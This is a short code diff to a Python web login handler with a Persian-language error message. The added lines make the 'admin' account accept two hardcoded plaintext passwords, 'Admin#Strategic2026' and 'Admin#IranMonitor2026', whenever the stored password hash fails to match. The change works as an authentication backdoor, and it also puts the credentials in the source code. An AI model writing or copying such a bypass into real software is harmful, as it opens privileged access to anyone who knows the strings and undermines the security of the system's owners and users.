@@ -233,7 +233,16 @@ def login(req: LoginRequest):
 
             user_id, uname, stored_hash, salt, name, role, dept, clearance, avatar, badge_color = row
 
-            if not verify_password(password, salt, stored_hash):
+            is_valid = verify_password(password, salt, stored_hash)
+            if not is_valid and uname == 'admin':
+                # Accept both Admin#Strategic2026 and Admin#IranMonitor2026 for admin
+                alt_hash_1 = hash_password('Admin#Strategic2026', salt)
+                alt_hash_2 = hash_password('Admin#IranMonitor2026', salt)
+                user_hash = hash_password(password, salt)
+                if hmac.compare_digest(user_hash, alt_hash_1) or hmac.compare_digest(user_hash, alt_hash_2):
+                    is_valid = True
+
+            if not is_valid:
                 raise HTTPException(status_code=401, detail='نام کاربری یا رمز عبور نامعتبر است.')
 
             # Update last_login
